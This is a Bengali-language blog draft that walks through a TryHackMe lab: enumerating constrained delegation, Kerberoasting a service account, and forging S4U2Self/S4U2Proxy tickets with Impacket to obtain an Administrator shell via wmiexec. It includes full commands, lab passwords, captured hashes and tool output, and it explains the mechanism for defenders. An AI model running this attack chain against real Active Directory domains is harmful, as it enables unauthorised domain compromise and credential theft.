---
date: '2026-06-07T12:00:38+06:00'
draft: true
title: 'লোকাল অ্যাডমিন (Local Admin) ছাড়াই কনস্ট্রেইনড ডেলিগেশন (Constrained Delegation) অ্যাবিউস করা'
---

অ্যাক্টিভ ডিরেক্টরি (Active Directory) পেনিট্রেশন টেস্টিংয়ে একটি প্রচলিত ভুল ধারণা রয়েছে যে, একটি কনস্ট্রেইনড ডেলিগেশন (Constrained Delegation) অ্যাটাক সফল করতে হলে আপনাকে প্রথমে একটি হোস্ট কম্প্রোমাইজ করতে হবে, লোকাল অ্যাডমিনিস্ট্রেটর হিসেবে প্রিভিলেজ এস্কেলেট (privilege escalate) করতে হবে এবং মেমরি থেকে ক্রেডেনশিয়াল ডাম্প করতে হবে।

যদিও LSASS ডাম্প করা একটি স্ট্যান্ডার্ড পদ্ধতি, তবে এটি কোনো বাধ্যতামূলক শর্ত নয়। টার্গেট যদি দুর্বল পাসওয়ার্ড দিয়ে কনফিগার করা কোনো ইউজার অ্যাকাউন্ট হয়, তবে একজন সাধারণ ডোমেইন ইউজার (domain user) টার্গেট এন্ডপয়েন্টের ডিস্ক স্পর্শ না করেই বা কোনো এলিভেটেড প্রিভিলেজ (elevated privileges) ছাড়াই সম্পূর্ণ নেটওয়ার্কের মাধ্যমে একটি পূর্ণাঙ্গ ডেলিগেশন অ্যাটাক চালাতে পারে এবং ডোমেইন অ্যাডমিনিস্ট্রেটর (Domain Administrator) ইমপার্সোনেট করতে পারে।

কার্বেরোস্টিং (Kerberoasting) এবং প্রোটোকল ট্রানজিশন (Protocol Transition) এর সমন্বয় কীভাবে জিরো-অ্যাডমিন (zero-admin) ডোমেইন কম্প্রোমাইজের সুযোগ তৈরি করে, এখানে তার একটি বিশ্লেষণাত্মক ব্রেকডাউন দেওয়া হলো, যেখানে মূল ফোকাস থাকবে Kerberos S4U এক্সটেনশনগুলোর অন্তর্নিহিত মেকানিজমের ওপর।

## ফেজ ১: মিসকনফিগারেশন শনাক্তকরণ (জিরো-টাচ এনিউমারেশন)

অ্যাটাকটি শুরু হয় একজন সাধারণ, আনপ্রিভিলেজড (unprivileged) ডোমেইন ইউজারের দৃষ্টিকোণ থেকে। এর উদ্দেশ্য হলো কনস্ট্রেইনড ডেলিগেশন (Constrained Delegation) কনফিগার করা অ্যাকাউন্টগুলো খোঁজার জন্য LDAP-এর মাধ্যমে অ্যাক্টিভ ডিরেক্টরিতে কোয়েরি করা।

Impacket-এর মাধ্যমে স্ট্যান্ডার্ড LDAP এনিউমারেশনের আউটপুটটি নিচে দেওয়া হলো:

```bash
impacket-findDelegation 'za.tryhackme.loc/t2_leon.francis:Password!1' -dc-ip 10.200.72.101

```

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

AccountName  AccountType  DelegationType                      DelegationRightsTo                 SPN Exists 
-----------  -----------  ----------------------------------  ---------------------------------  ----------
THMDC$       Computer     Unconstrained                       N/A                                Yes        
svcIIS       Person       Constrained w/ Protocol Transition  WSMAN/THMSERVER1.za.tryhackme.loc  Yes        
svcIIS       Person       Constrained w/ Protocol Transition  WSMAN/THMSERVER1                   Yes        
svcIIS       Person       Constrained w/ Protocol Transition  http/THMSERVER1.za.tryhackme.loc   No         
svcIIS       Person       Constrained w/ Protocol Transition  http/THMSERVER1                    No         

```

**মেকানিজম:**

এখানকার সবচেয়ে গুরুত্বপূর্ণ বিষয়টি হলো `Constrained w/ Protocol Transition`। অ্যাক্টিভ ডিরেক্টরিতে এটি `TRUSTED_TO_AUTH_FOR_DELEGATION` (T2A4D) ইউজার অ্যাকাউন্ট কন্ট্রোল ফ্ল্যাগের সাথে সম্পর্কিত।

যখন কোনো সার্ভিস অ্যাকাউন্টে এই ফ্ল্যাগটি থাকে, তখন সেটি **S4U2Self** Kerberos এক্সটেনশন ব্যবহার করার অনুমতি পায়। এর মানে হলো `svcIIS` অ্যাকাউন্টটি ডোমেইনের *যেকোনো* ইউজারের হয়ে নিজের জন্য একটি সার্ভিস টিকেট রিকোয়েস্ট করতে পারে এবং এর জন্য ওই ইউজারের কোনো পাসওয়ার্ড দেওয়ার প্রয়োজন হয় না। `DelegationRightsTo` কলামটি নির্দেশ করে যে, পরবর্তীতে সেই টিকেট কোথায় ফরোয়ার্ড করা যাবে।

যেহেতু `svcIIS` অ্যাকাউন্টটি একটি `Person` (মেশিন অ্যাকাউন্ট নয়, বরং একটি ইউজার অ্যাকাউন্ট) হিসেবে চিহ্নিত, তাই এর সাথে একটি Service Principal Name (SPN) যুক্ত থাকার প্রবল সম্ভাবনা রয়েছে, যা এটিকে অফলাইন অ্যাটাকের জন্য একটি উপযুক্ত টার্গেটে পরিণত করে।

## ফেজ ২: নীরবে তথ্য বের করা (Kerberoasting)

যদি `svcIIS` কোনো মেশিন অ্যাকাউন্ট (Machine Account) বা গ্রুপ ম্যানেজড সার্ভিস অ্যাকাউন্ট (gMSA) হতো, তবে মেমরি থেকে এর ১২০-ক্যারেক্টারের রোটেটিং পাসওয়ার্ডটি বের করার জন্য লোকাল অ্যাডমিনিস্ট্রেটর রাইটস (local administrator rights) এর প্রয়োজন হতো। কিন্তু, যেহেতু এটি একটি স্ট্যান্ডার্ড ইউজার অ্যাকাউন্ট, তাই Kerberos প্রোটোকল যেকোনো অথেনটিকেটেড ইউজারকে এর জন্য একটি Ticket Granting Service (TGS) টিকেটের রিকোয়েস্ট করার অনুমতি দেয়।

```bash
impacket-GetUserSPNs 'za.tryhackme.loc/t2_leon.francis:Password!1' -dc-ip 10.200.72.101 -request-user svcIIS -outputfile svciis_hash.txt

```

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName              Name    MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------------------  ------  --------  --------------------------  --------------------------  -----------
HTTP/svcServWeb.za.tryhackme.loc  svcIIS            2022-04-29 06:50:25.152583  2026-06-06 02:39:59.678483  constrained 

```

```bash
cat svciis_hash.txt 

```

```text
$krb5tgs$23$*svcIIS$ZA.TRYHACKME.LOC$za.tryhackme.loc/svcIIS*$7a12eb6bc2931fcdce8642b84802abf3$de111089e45e098cae387582a264b65134254d525944fad820e2fa158049f95997a8e433152464da942d3fe8732aee21a026fa9bb6c5b921024a9afa21fe9996142b131e0fda7e363be164c241a1ccf22f896275c5336fa28efb1c56fcfbb573a172eff6f696092b9246e62265c69436fa0fb05b3b3eb85554238b793803ad4f20bb43d852617c3bbbecfa882b681b55c2799bc8f0d0fd20b42f909c07f0daa10330c70986c28d9fe805bbc4658e0c91bf3d018580c383090f6b2c261780c66981b122692341e941bed71523cef3e45f80ae021eaa0401505ff9953b577e8d80d639e6dd311bbda0f4663835954a0177076afd4dd28413840786f0978fc346e9b2a9582fcd4ba063b1aea416d7c24ea16c001c282cde5dc6e595674c94a7f909097c777b26cbcccdf08631a041d2133d7f7ad0251869271162e2fbcf297b889c3962fe79c773b855f33ddfebe2f0f8fb1c2db1dd953265fb053593ca86f8cfc7286d0209c5817ebf07dbaec3cc729c60aa157385caa6d43e6d05b202044c9dfab264c2e31417de824d6df97b0151416daed3019c9f14dd720283046615adfb09033d664603170317b8bc441b745e06fc50ca4dca29d795a6adafbcc8e76892854cd8a6f9e6e7d0e3289f96825537ca4f2816fe0760bfc519bcc4a8e75c746e70437233da7ee2c2eaf4c029ba52db618e83894a043e3bd0e879e01fc331fec4aa0f94b60dcc9c8dc9687b8e6d3844928a1972afe26a2a365047c164663689da81ec49dedb8c78cdffd8ae8db066d616890808d6de02f65914d4476235654684b1d62bedf952ad217ca34271115b30254df47272b8601f420de177dfaa569f9b22aa597616a94a25c8e7e43c02a9b6f2c715ddbc80254c7fd6bea60a8b96aa897596709d2bafb476a90aa4a5e3899ecdbabc5bf2419ca819973c5f6d84a0b64c712b0236c63bcdc8e55e3431f0a1763065f4ad8932376be754c6fcaf07e0318cbcaf0974e81ce4015e230a37bca6e0479440349afba0f0cd95f19eae02c40bbffdb48aff8c0501a787f11447a1b7350b4246b2aa27ee146de7e2c7386b82a52fa0f4631a05d14f47c12df65a7aff10d1a73c1856e729672771b502e591cf22334132f037a91cdb3aabccb28b86d844fe65f9fa482b7cd58912ede84524284ea930b3e976a4c4e00294d4c564f6e7acdc4d461e7e4d084e44f01e242aad481ba591381dd5ac767d236c5fc836695df90bb7f6d2db3fc7a2970218ed765e0fecf4f7fb6b71b6bd1ccf1ed2ba83c7b5e07cf2cbb7168ab4f837241dcb841f7cf64253684cd82b3ab6e2d54db8843149eaee768198aca08c4f91229a26cd5682ea1b5e774e0b62fa4931a47a2e7623471b83d2453608741e848812316a01df8e749789dec723b9e9083e1c

```

**মেকানিজম:**

ডোমেইন কন্ট্রোলার (Domain Controller) `svcIIS` অ্যাকাউন্টের পাসওয়ার্ডের RC4-HMAC হ্যাশ দ্বারা এনক্রিপ্ট করা একটি TGS রিটার্ন করে। অ্যাটাকারের কাছে এখন `svcIIS` হিসেবে অথেনটিকেট করার জন্য প্রয়োজনীয় ক্রিপ্টোগ্রাফিক ম্যাটেরিয়াল রয়েছে। এই হ্যাশটি অফলাইনে নিয়ে ক্র্যাক করার মাধ্যমে (যেমন, `Password1@` উদ্ধার করে), অ্যাটাকার টার্গেট IIS সার্ভারে কোনো কোড এক্সিকিউট না করেই সার্ভিস অ্যাকাউন্টটির সম্পূর্ণ নিয়ন্ত্রণ পেয়ে যায়।

## ফেজ ৩: ভিআইপি পাস তৈরি করা (S4U2Self এবং S4U2Proxy)

এখান থেকেই মূলত জিরো-অ্যাডমিন (zero-admin) অ্যাটাকের বিষয়টি পরিষ্কার হয়ে ওঠে। প্লেইনটেক্সট (plaintext) পাসওয়ার্ডটি উদ্ধার করার পর, অ্যাটাকার এর NT Hash (`43460d636f269c709b20049cee36ae7a`) বের করে নেয় এবং প্রোটোকল অ্যাবিউস (protocol abuse) শুরু করে।

```bash
impacket-getST za.tryhackme.loc/svcIIS -hashes :43460d636f269c709b20049cee36ae7a -spn wsman/THMSERVER1.za.tryhackme.loc -impersonate Administrator -k

```

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@wsman_THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.ccache

```

**মেকানিজম:**

এই একটি মাত্র কমান্ড পুরো নেটওয়ার্ক জুড়ে কনস্ট্রেইনড ডেলিগেশন অ্যাটাকের মূল কাজটি সম্পন্ন করে:

১. **S4U2Self:** অ্যাটাকার `svcIIS` হিসেবে অথেনটিকেট করে এবং `Administrator` অ্যাকাউন্টের হয়ে নিজের জন্য একটি টিকেটের রিকোয়েস্ট করে। যেহেতু `svcIIS` এর প্রোটোকল ট্রানজিশন (Protocol Transition) এনাবেল করা আছে, তাই ডোমেইন কন্ট্রোলার রিকোয়েস্টটি গ্রহণ করে এবং একটি ফরোয়ার্ডেবল (forwardable) টিকেট ইস্যু করে।

২. **S4U2Proxy:** অ্যাটাকার সাথে সাথেই সেই ফরোয়ার্ডেবল টিকেটটি নেয় এবং সেটিকে পুনরায় ডোমেইন কন্ট্রোলারের কাছে উপস্থাপন করে, যা LDAP এনিউমারেশনে (যেমন `wsman/THMSERVER1`) সংজ্ঞায়িত ডাউনস্ট্রিম সার্ভিসে অ্যাক্সেস করার জন্য রিকোয়েস্ট করে।

৩. **ফলাফল:** ডোমেইন কন্ট্রোলার একটি বৈধ Kerberos Service Ticket ইস্যু করে, যা প্রমাণ করে যে অ্যাটাকার সেই নির্দিষ্ট সার্ভিসের জন্য ডোমেইন `Administrator`।

পুরো প্রক্রিয়ার কোনো পর্যায়েই `Administrator` পাসওয়ার্ড গেস বা অনুমান করার প্রয়োজন হয়নি, এবং কোনো এলিভেটেড সেশনেরও (elevated session) দরকার পড়েনি।

## ফেজ ৪: রিয়ালিস্টিক ইমপ্যাক্ট এক্সিকিউশন (বাস্তব প্রভাব)

এই তৈরি করা (forged) টিকেটটি লোকাল ক্রেডেনশিয়াল ক্যাশে (local credential cache) এক্সপোর্ট করার পর, অ্যাটাকার টার্গেট সার্ভারের সাথে ইন্টারঅ্যাক্ট করার জন্য WMI (Windows Management Instrumentation) বা WinRM-এর মতো নেটিভ রিমোট অ্যাডমিনিস্ট্রেশন প্রোটোকলগুলো ব্যবহার করতে পারে।

```bash
export KRB5CCNAME=Administrator@wsman_THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.ccache

```

```bash
impacket-wmiexec -k -no-pass za.tryhackme.loc/Administrator@THMSERVER1.za.tryhackme.loc

```

```text
za.tryhackme.loc/Administrator@THMSERVER1.za.tryhackme.loc
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
za\administrator

C:\>

```

**প্রভাব (Impact):**

এই অ্যাটাক পাথের ডেটা ইন্টিগ্রিটি মূল্যায়ন করলে এর ভয়াবহতা পরিষ্কার হয়ে যায়। একজন লো-প্রিভিলেজ (low-privilege) অ্যাটাকার সিকিউরিটি বাউন্ডারি বাইপাস করার জন্য একটি স্ট্যান্ডার্ড প্রোটোকল ফিচার ব্যবহার করেছে, যার ফলে একটি সেনসিটিভ সার্ভারে সে ইন্টারঅ্যাকটিভ `administrator` লেভেলের শেল পেয়ে গেছে।

অ্যাটাকারদের ডেলিগেশন অ্যাবিউস করার জন্য প্রথমে এন্ডপয়েন্টগুলো কম্প্রোমাইজ করতে হবে—এমন ধারণার ওপর নির্ভর করাটা একটি মারাত্মক ব্লাইন্ড স্পট বা দুর্বলতা তৈরি করে। যতক্ষণ পর্যন্ত প্রোটোকল ট্রানজিশনের সাথে ক্র্যাক করার যোগ্য (crackable) পাসওয়ার্ড যুক্ত থাকবে, ততক্ষণ নেটওয়ার্কটি রিমোট এবং আনপ্রিভিলেজড ডোমেইন কম্প্রোমাইজের ঝুঁকির মধ্যে থাকবে।